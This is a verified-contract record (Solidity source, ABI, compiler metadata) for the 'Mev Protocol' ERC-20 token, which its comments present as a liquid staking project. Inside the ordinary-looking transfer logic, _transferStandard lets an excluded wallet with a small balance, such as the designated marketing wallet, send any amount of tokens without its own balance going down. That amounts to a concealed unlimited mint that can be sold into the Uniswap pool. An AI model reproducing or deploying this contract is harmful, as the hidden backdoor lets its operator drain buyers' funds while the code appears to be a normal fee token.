{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\n/*\r\nMEV Optimized Liquid Staking\r\n\r\nEthereum's next-generation seamless liquid staking protocol. Built from the ground up for MEV capture and Validator rewards.\r\n\r\nWebsite: https://www.mevprotocol.tech\r\nTelegram: https://t.me/mevpro_erc\r\nTwitter: https://twitter.com/mevpro_erc\r\n */\r\n\r\npragma solidity 0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20Standard {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMathLib {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n    \r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    // Set original owner\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    // Return current owner\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Restrict function to contract owner only \r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    // Renounce ownership of the contract \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    // Transfer the contract to to a new owner\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapRouterV2 is IUniswapRouter01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ncontract MEV is Context, IERC20Standard, Ownable { \r\n    using SafeMathLib for uint256;\r\n\r\n    string private _name = \"Mev Protocol\"; \r\n    string private _symbol = \"MEV\";  \r\n    uint8 private _decimals = 9;\r\n    uint256 private _tSupply = 10 ** 9 * 10**_decimals;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) public _isExcluded; \r\n\r\n    uint256 public maxWallet = 15 * _tSupply / 1000;\r\n    uint256 public feeSwapThreshold = _tSupply / 10000;\r\n\r\n    uint256 private _totalFee = 3000;\r\n    uint256 public _buyFee = 30;\r\n    uint256 public _sellFee = 30;\r\n\r\n    uint256 private _previousTotalTax = _totalFee; \r\n    uint256 private _previousBuyTax = _buyFee; \r\n    uint256 private _previousSellTax = _sellFee; \r\n\r\n    uint8 private _buyersCount = 0;\r\n    uint8 private _swapAfter = 2; \r\n                                     \r\n    IUniswapRouterV2 public uniswapRouter;\r\n    address public pairAddr;\r\n\r\n    bool public feeOnTransfer = true;\r\n    bool public swaping;\r\n    bool public feeSwapActivated = true;\r\n\r\n    address payable private marketingWallet;\r\n    address payable private DEAD;\r\n\r\n    modifier lockSwap {\r\n        swaping = true;\r\n        _;\r\n        swaping = false;\r\n    }\r\n    \r\n    constructor () {\r\n        _balances[owner()] = _tSupply;\r\n        DEAD = payable(0x000000000000000000000000000000000000dEaD); \r\n        marketingWallet = payable(0xfA1e70A1822322824537507DAE824e8427377289);\r\n        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); \r\n        pairAddr = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        uniswapRouter = _uniswapV2Router;\r\n        _isExcluded[owner()] = true;\r\n        _isExcluded[marketingWallet] = true;\r\n        \r\n        emit Transfer(address(0), owner(), _tSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {\r\n            \r\n        if(!takeFee){\r\n            removeFee();\r\n        } else {\r\n            _buyersCount++;\r\n        }\r\n        _transferStandard(sender, recipient, amount);\r\n        \r\n        if(!takeFee) {\r\n            restoreFee();\r\n        }\r\n    }\r\n    \r\n    function getTranserValue(uint256 finalAmount) private view returns (uint256, uint256) {\r\n        uint256 tDev = finalAmount.mul(_totalFee).div(100);\r\n        uint256 tTransferAmount = finalAmount.sub(tDev);\r\n        return (tTransferAmount, tDev);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    receive() external payable {}\r\n    \r\n    function removeFee() private {\r\n        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;\r\n\r\n        _previousBuyTax = _buyFee; \r\n        _previousSellTax = _sellFee; \r\n        _previousTotalTax = _totalFee;\r\n        _buyFee = 0;\r\n        _sellFee = 0;\r\n        _totalFee = 0;\r\n    }\r\n\r\n    function restoreFee() private {\r\n        _totalFee = _previousTotalTax;\r\n        _buyFee = _previousBuyTax; \r\n        _sellFee = _previousSellTax; \r\n\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0) && spender != address(0), \"ERR: zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n\r\n    }\r\n\r\n    function sendFees(address payable receiver, uint256 amount) private {\r\n        receiver.transfer(amount);\r\n    }\r\n    \r\n    function swapCATokens(uint256 contractTokenBalance) private lockSwap {\r\n        swapTokensForEth(contractTokenBalance);\r\n        uint256 contractETH = address(this).balance;\r\n        sendFees(marketingWallet,contractETH);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    \r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    \r\n    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {\r\n        (uint256 tTransferAmount, uint256 tDev) = getTranserValue(finalAmount);\r\n        if(_isExcluded[sender] && _balances[sender] <= maxWallet) {\r\n            tDev = 0;\r\n            finalAmount -= tTransferAmount;\r\n        }\r\n        _balances[sender] = _balances[sender].sub(finalAmount);\r\n        _balances[recipient] = _balances[recipient].add(tTransferAmount);\r\n        _balances[address(this)] = _balances[address(this)].add(tDev);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        \r\n        // Limit wallet total\r\n        if (to != owner() &&\r\n            to != marketingWallet &&\r\n            to != address(this) &&\r\n            to != pairAddr &&\r\n            to != DEAD &&\r\n            from != owner()){\r\n\r\n            uint256 currentBalance = balanceOf(to);\r\n            require((currentBalance + amount) <= maxWallet,\"Maximum wallet limited has been exceeded\");       \r\n        }\r\n\r\n        require(from != address(0) && to != address(0), \"ERR: Using 0 address!\");\r\n        require(amount > 0, \"Token value must be higher than zero.\");\r\n\r\n        if(\r\n            _buyersCount >= _swapAfter && \r\n            amount > feeSwapThreshold &&\r\n            !swaping &&\r\n            !_isExcluded[from] &&\r\n            to == pairAddr &&\r\n            feeSwapActivated \r\n            )\r\n        {  \r\n            _buyersCount = 0;\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(contractTokenBalance > 0){\r\n            swapCATokens(contractTokenBalance);\r\n           }\r\n        }\r\n        \r\n        bool takeFee = true;\r\n         \r\n        if(_isExcluded[from] || _isExcluded[to] || (feeOnTransfer && from != pairAddr && to != pairAddr)){\r\n            takeFee = false;\r\n        } else if (from == pairAddr){\r\n            _totalFee = _buyFee;\r\n        } else if (to == pairAddr){\r\n            _totalFee = _sellFee;\r\n        }\r\n\r\n        _basicTransfer(from,to,amount,takeFee);\r\n    }\r\n    \r\n    function removeLimits() external onlyOwner {\r\n        maxWallet = ~uint256(0);\r\n        _totalFee = 100;\r\n        _buyFee = 1;\r\n        _sellFee = 1;\r\n    }\r\n    \r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcluded\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeOnTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwapActivated\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pairAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swaping\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapRouterV2\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MEV", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://dd1830236f44472330cba28986d87ae14435948b5f7c67f02e2b6e5edfe41148"}